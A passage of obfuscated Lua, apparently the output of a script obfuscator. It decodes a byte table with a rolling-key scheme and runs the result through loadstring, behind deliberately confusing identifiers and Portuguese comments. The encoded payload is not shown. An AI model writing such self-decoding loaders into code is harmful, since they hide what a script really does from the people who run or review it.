    local function VM_OO0l1(d, k, m)
        local R_IlOOl = {}
        local c_key = k
        local char = string.char
        local insert = table.insert
        
        -- Virtual Machine Loop
        for idx = 1, #d do
            local val = d[idx]
            -- Decodificacao Rolling Key
            local dec = (val / m) - c_key
            
            -- Anti-Crash Mobile (Garante byte valido)
            dec = dec % 256
            
            insert(R_IlOOl, char(dec))
            
            -- Atualiza a chave para o proximo (Rolling)
            c_key = (c_key + 13) % 150
        end
        return table.concat(R_IlOOl)
    end

    -- Execution Guard
    local F_O10110I = loadstring(VM_OO0l1(B_O1II, 53, 5))
    if F_O10110I then
        F_O10110I(...)
    end
end)(...)
